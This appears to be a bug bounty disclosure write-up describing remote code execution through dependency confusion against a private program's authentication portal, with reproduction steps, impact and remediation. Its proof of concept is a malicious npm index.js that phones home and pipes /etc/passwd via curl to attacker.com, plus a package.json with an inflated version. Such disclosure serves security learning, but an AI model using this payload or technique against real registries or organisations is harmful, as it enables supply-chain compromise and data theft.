# Title: RCE via Dependency Confusion on Private HackerOne Program - $5,000

- **Platform**: HackerOne
- **Program**: Private Program (Custom Auth Portal)
- **Severity**: Critical
- **Date**: 2024-06-15
- **Researcher**: Redacted
- **Bounty**: $5,000

## Summary
A remote code execution vulnerability was discovered through dependency confusion in a custom authentication portal. By analyzing the application's JavaScript source maps, the researcher identified an unclaimed NPM package that was imported by the application. Registering a malicious version of this package achieved RCE.

## Technical Details
The target was a custom authentication portal used to access multiple internal applications. The researcher analyzed the JavaScript bundles loaded by the login page. Using a tool called Sourcemapper, the researcher reconstructed the front-end source code from the bundled JS files and source maps.

Within the reconstructed source code, import statements revealed references to an internal NPM package. This package was not available on the public npm registry, making it susceptible to dependency confusion. The researcher registered the missing package name on npmjs.org with a higher version number and included malicious code that executed when the application imported it.

## Steps to Reproduce
1. Browse to the authentication portal login page
2. Download the bundled JS file (app.[hash].js)
3. Use Sourcemapper to extract source maps: `sourcemapper -url https://target.com/assets/app.[hash].js -output ./source/`
4. Examine import statements for internal packages
5. Check if packages exist on npm registry
6. Register missing packages with malicious code on npm
7. Set up Burp Collaborator for callback detection
8. Wait for the application to install/load the malicious package
9. Receive callback confirming code execution

## Proof of Concept
The malicious index.js published to npm:
```javascript
const http = require('http');
const options = {
  hostname: 'burpcollaborator.net',
  path: '/rce',
  method: 'GET'
};
const req = http.request(options);
req.end();

// Data exfiltration
require('child_process').exec('cat /etc/passwd | curl -d @- http://attacker.com/exfil');
```

The package.json published with a higher version:
```json
{
  "name": "internal-package-name",
  "version": "99.0.0",
  "main": "index.js"
}
```

## Impact
- Remote code execution on the application server
- Access to sensitive data and credentials
- Potential pivot to internal network
- Full server compromise
- Access to production database

## Remediation
The program removed the dependency on the public npm package and implemented internal package scoping. They also added integrity checking and code review processes for all dependencies. The fix was deployed within 24 hours of reporting.

## References
- https://readmedium.com/rce-due-to-dependency-confusion-5000-bounty-fd1b294d645f
